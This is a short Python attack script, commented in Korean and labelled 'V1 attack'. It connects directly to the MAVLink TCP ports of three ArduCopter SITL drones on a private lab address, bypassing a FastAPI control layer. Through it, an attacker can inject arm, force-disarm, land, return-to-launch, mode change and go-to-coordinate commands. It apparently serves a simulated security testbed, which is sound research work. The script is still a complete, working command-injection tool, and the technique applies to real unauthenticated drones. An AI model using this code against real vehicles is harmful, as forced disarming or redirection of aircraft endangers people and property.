#!/usr/bin/env python3
"""V1 공격: Windows에서 SITL TCP 포트에 직접 MAVLink 주입 (FastAPI 우회)."""
import argparse
import time
from pymavlink import mavutil

DRONE_PORTS = {"drone-01": 5760, "drone-02": 5770, "drone-03": 5780}
SITL_HOST   = "192.168.56.101"


def connect(drone_id: str) -> mavutil.mavfile:
    port = DRONE_PORTS[drone_id]
    print(f"[CONNECT] {drone_id} @ {SITL_HOST}:{port}")
    conn = mavutil.mavlink_connection(f"tcp:{SITL_HOST}:{port}", source_system=255)
    conn.wait_heartbeat(timeout=10)
    conn.target_system    = 1  # ArduCopter SITL 고정값
    conn.target_component = 1
    print(f"[READY]   sysid={conn.target_system}  compid={conn.target_component}")
    return conn


def send_cmd(conn: mavutil.mavfile, cmd: str, params: dict) -> None:
    ts = 1  # ArduCopter SITL 고정값
    if cmd == "ARM":
        conn.mav.command_long_send(ts, 1, 400, 0, 1.0, 21196.0, 0, 0, 0, 0, 0)
        print(f"[SEND]    COMMAND_LONG ARM (cmd=400, p1=1.0, p2=21196)")
    elif cmd == "DISARM":
        conn.mav.command_long_send(ts, 1, 400, 0, 0.0, 21196.0, 0, 0, 0, 0, 0)
        print(f"[SEND]    COMMAND_LONG DISARM (cmd=400, p1=0.0, p2=21196)")
    elif cmd == "LAND":
        conn.mav.command_long_send(ts, 1, 21, 0, 0, 0, 0, 0, 0, 0, 0)
        print(f"[SEND]    COMMAND_LONG LAND (cmd=21)")
    elif cmd == "RTL":
        conn.mav.command_long_send(ts, 1, 20, 0, 0, 0, 0, 0, 0, 0, 0)
        print(f"[SEND]    COMMAND_LONG RTL (cmd=20)")
    elif cmd == "GOTO":
        lat = int(params["lat"] * 1e7)
        lon = int(params["lon"] * 1e7)
        alt = float(params.get("alt", 30))
        conn.mav.set_position_target_global_int_send(
            0, ts, 1,
            0b0000111111111000,  # type_mask: position only
            lat, lon, alt,
            0, 0, 0, 0, 0, 0, 0, 0
        )
        print(f"[SEND]    SET_POSITION_TARGET lat={lat/1e7:.6f} lon={lon/1e7:.6f} alt={alt}")
        return
    elif cmd == "GUIDED":
        conn.mav.command_long_send(ts, 1, 176, 0, 4, 0, 0, 0, 0, 0, 0)
        print(f"[SEND]    COMMAND_LONG SET_MODE GUIDED (cmd=176, p1=4)")


def wait_ack(conn: mavutil.mavfile, timeout: float = 5.0) -> bool:
    # SITL은 ACK를 먼저 연결된 FastAPI TCP 클라이언트로 보냄
    # 직접 수신 불가 → GCS 브라우저에서 상태 변화로 확인
    print(f"[ACK]     명령 전송 완료 (ACK는 GCS 화면에서 확인)")
    print(f"[VERIFY]  → http://192.168.56.101:8000/gcs/ 에서 드론 상태 확인")
    return True


def main():
    ap = argparse.ArgumentParser(
        description="V1 공격: SITL에 직접 MAVLink 명령 주입"
    )
    ap.add_argument("--drone",  required=True, choices=list(DRONE_PORTS),
                    help="대상 드론 ID")
    ap.add_argument("--cmd",    required=True,
                    choices=["ARM", "DISARM", "LAND", "RTL", "GOTO", "GUIDED"],
                    help="주입할 명령")
    ap.add_argument("--lat",    type=float, default=37.566535,
                    help="GOTO 위도")
    ap.add_argument("--lon",    type=float, default=126.977969,
                    help="GOTO 경도")
    ap.add_argument("--alt",    type=float, default=30.0,
                    help="GOTO 고도 (m)")
    args = ap.parse_args()

    print(f"\n=== V1 공격 스크립트 ===")
    print(f"대상: {args.drone}  명령: {args.cmd}")
    print(f"경로: Windows(192.168.56.1) → SITL({SITL_HOST}:{DRONE_PORTS[args.drone]}) [FastAPI 우회]\n")

    conn = connect(args.drone)
    send_cmd(conn, args.cmd, {"lat": args.lat, "lon": args.lon, "alt": args.alt})
    wait_ack(conn)
    conn.close()
    print("\n[DONE]    연결 종료")


if __name__ == "__main__":
    main()
